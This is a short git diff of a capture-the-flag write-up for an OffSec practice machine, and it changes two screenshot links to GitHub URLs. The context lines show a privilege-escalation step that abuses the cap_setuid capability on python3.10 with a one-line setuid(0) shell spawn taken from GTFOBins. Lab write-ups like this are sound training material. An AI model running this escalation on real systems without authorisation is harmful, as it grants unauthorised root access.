@@ -186,9 +186,9 @@ I saw the linpeas output and checked the capabilities in Google.
 
 Google search: `/usr/bin/python3.10 cap_setuid=ep privilege escalation`
 
-![Google Search Python Privilege Escalation](googlepythonprivesca.png "Google Search Python Privilege Escalation")
+![Google Search Python Privilege Escalation](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Levram/screenshots/googlepythonprivesca.png "Google Search Python Privilege Escalation")
 
-![GTFOBins Exploit](gtfobinsexploit.png "GTFOBins Exploit")
+![GTFOBins Exploit](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Levram/screenshots/gtfobinsexploit.png "GTFOBins Exploit")
 
 ```text
 app@ubuntu:/tmp$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
